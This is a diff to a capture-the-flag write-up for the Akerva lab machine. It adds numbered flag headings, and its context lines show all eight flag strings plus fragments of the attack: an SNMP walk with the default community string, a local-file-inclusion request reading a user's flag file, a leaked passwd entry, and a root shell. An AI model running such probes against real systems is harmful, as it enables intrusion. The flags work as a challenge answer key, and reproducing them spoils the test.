@@ -190,6 +190,8 @@ This fun fortress from Akerva features a gradual learning curve. It teaches abou
 <!-- By the way, the first flag is: AKERVA{Ikn0w_F0rgoTTEN#CoMmeNts} -->
 ```
 
+## flag - 01
+
 ```plaintext title="Flag"
 AKERVA{Ikn0w_F0rgoTTEN#CoMmeNts}
 ```
@@ -201,6 +203,8 @@ AKERVA{Ikn0w_F0rgoTTEN#CoMmeNts}
 ```plaintext title='snmpbulkwalk -c public -v2c 10.13.37.11 | grep"AKERVA"'
 iso.3.6.1.2.1.25.4.2.1.5.1243 = STRING: "/var/www/html/scripts/backup_every_17minutes.sh AKERVA{IkN0w_SnMP@@@MIsconfigur@T!onS}"
 ```
+
+## flag - 02
 
 ```plaintext title="Flag"
 AKERVA{IkN0w_SnMP@@@MIsconfigur@T!onS}
@@ -258,6 +262,8 @@ do
 done
 ```
 
+## flag - 03
+
 ```plaintext title="Flag
 AKERVA{IKNoW###VeRbTamper!nG_==}
 ```
@@ -296,6 +302,8 @@ users = {
         "aas": generate_password_hash("AKERVA{1kn0w_H0w_TO_$Cr1p_T_$$$$$$$$}")
         }
 ```
+
+## flag - 04
 
 ```plaintext title="Flag"
 AKERVA{1kn0w_H0w_TO_$Cr1p_T_$$$$$$$$}
@@ -389,6 +397,8 @@ aas:x:1000:1000:Lyderic Lefebvre:/home/aas:/bin/bash
 ```plaintext title="http://10.13.37.11:5000/file?filename=/home/aas/flag.txt"
 AKERVA{IKNOW#LFi_@_}
 ```
+
+## flag - 05
 
 ```plaintext title="Flag
 AKERVA{IKNOW#LFi_@_}
@@ -525,6 +535,8 @@ dr-xr-x--- 2 aas  aas  4.0K Feb 10  2020 .ssh
 AKERVA{IkNOW#=ByPassWerkZeugPinC0de!}
 ```
 
+## flag - 06
+
 ```plaintext title="Flag
 AKERVA{IkNOW#=ByPassWerkZeugPinC0de!}
 ```
@@ -563,6 +575,8 @@ total 8.0K
 (remote) root@Leakage:/root# cat flag.txt
 AKERVA{IkNow_Sud0_sUckS!}
 ```
+
+## flag - 07
 
 ```plaintext title="Flag"
 AKERVA{IkNow_Sud0_sUckS!}
@@ -615,6 +629,8 @@ welldoneforsolvingthischallengeyoucansendyourresumehereatrecrutementakervacomand
 well done for solving this challenge you can send your resume here at recrutement akerva com
 and validate the last flag with akerva iknooowvigeeenerrre
 ```
+
+## flag - 08
 
 ```plaintext title="Flag"
 AKERVA{iknooowvigeeenerrre}
